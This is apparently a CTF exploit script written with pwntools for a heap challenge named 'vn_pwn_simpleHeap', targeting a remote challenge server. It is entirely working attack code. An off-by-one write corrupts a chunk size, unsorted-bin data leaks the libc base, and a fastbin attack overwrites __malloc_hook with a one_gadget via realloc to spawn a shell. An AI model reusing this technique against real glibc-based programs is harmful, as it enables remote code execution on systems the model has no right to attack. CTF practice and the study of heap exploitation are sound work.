from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './vn_pwn_simpleHeap'
context.binary = binary
elf = ELF(binary,checksec=False)
p = remote('node3.buuoj.cn',28654) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,4,2,3
def add(size,content='a'):
	sla(':',str(_add))
	sla('?',str(size))
	sa(':',content)

def free(index):
	sla(':',str(_free))
	sla('?',str(index))

def edit(index,content):
	sla(':',str(_edit))
	sla('?',str(index))
	sa(':',content)

def show(index):
	sla(':',str(_show))
	sla('?',str(index))

# start
add(0x18) # 0
add(0x68) # 1
add(0x68) # 2
add(0x18) # 3

edit(0,'a'*0x18+'\xe1')
free(1)
add(0x68) # 1
show(2)
base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
malloc_hook = base+libc.sym['__malloc_hook']

add(0x60) # 4 <-> 2
free(3)
free(2)
edit(4,p64(malloc_hook-0x23)+'\n')
add(0x60)
add(0x60,flat('a'*11,base+0x4526a,base+libc.sym['realloc']+13))
sla(':',str(_add))
sla('?',str(0x18))
# end

itr()